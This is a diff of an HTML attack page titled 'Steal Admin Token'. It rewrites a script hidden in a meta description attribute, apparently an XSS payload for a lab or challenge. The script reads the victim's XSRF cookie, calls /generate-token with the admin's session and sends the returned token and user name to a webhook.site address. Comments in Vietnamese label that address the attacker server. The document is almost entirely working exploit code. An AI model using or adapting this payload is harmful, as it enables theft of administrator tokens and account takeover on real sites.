@@ -2,35 +2,49 @@
 <html>
 <head>
   <meta charset="utf-8">
-  <title>Get Admin Token</title>
+  <title>Steal Admin Token</title>
   <meta name="description" content='<script>
-    (function () {
-      var webhook = "https://webhook.site/2b4d8efe-d632-441b-94e9-ffbfc14c48c5";
+    (async function () {
+      const webhook = "https://webhook.site/2b4d8efe-d632-441b-94e9-ffbfc14c48c5";
 
-      // Lấy XSRF-TOKEN từ cookie
-      var xsrf = document.cookie.split(";").find(c => c.trim().startsWith("XSRF-TOKEN="));
-      if (!xsrf) return;
-      xsrf = decodeURIComponent(xsrf.trim().substring("XSRF-TOKEN=".length));
-
-      // Gửi POST để lấy token
-      fetch("/generate-token", {
-        method: "POST",
-        headers: {
-          "Accept": "application/json",
-          "X-XSRF-TOKEN": xsrf
-        },
-        credentials: "include"
-      })
-      .then(r => r.json())
-      .then(data => {
-        if (data.token) {
-          new Image().src = webhook + "?token=" + encodeURIComponent(data.token);
+      // Lấy XSRF token từ cookie
+      let xsrf = null;
+      document.cookie.split(";").forEach(c => {
+        c = c.trim();
+        if (c.startsWith("XSRF-TOKEN=")) {
+          xsrf = decodeURIComponent(c.substring("XSRF-TOKEN=".length));
         }
       });
+
+      if (!xsrf) return;
+
+      try {
+        const res = await fetch("/generate-token", {
+          method: "POST",
+          headers: {
+            "Accept": "application/json",
+            "X-XSRF-TOKEN": xsrf,
+            "X-Requested-With": "XMLHttpRequest"
+          },
+          credentials: "include" // Gửi cookie admin
+        });
+
+        const data = await res.json();
+
+        if (data.token) {
+          // Gửi token về attacker server
+          const img = new Image();
+          img.src = `${webhook}?token=${encodeURIComponent(data.token)}&name=${encodeURIComponent(data.user?.name || "unknown")}`;
+        }
+      } catch (e) {
+        // Gửi lỗi nếu cần
+        const img = new Image();
+        img.src = `${webhook}?error=${encodeURIComponent(e.toString())}`;
+      }
     })();
   </script>'>
 </head>
 <body>
-  <h1>Stealing Admin Token</h1>
+  <h1>Token Stealing Page</h1>
 </body>
 </html>
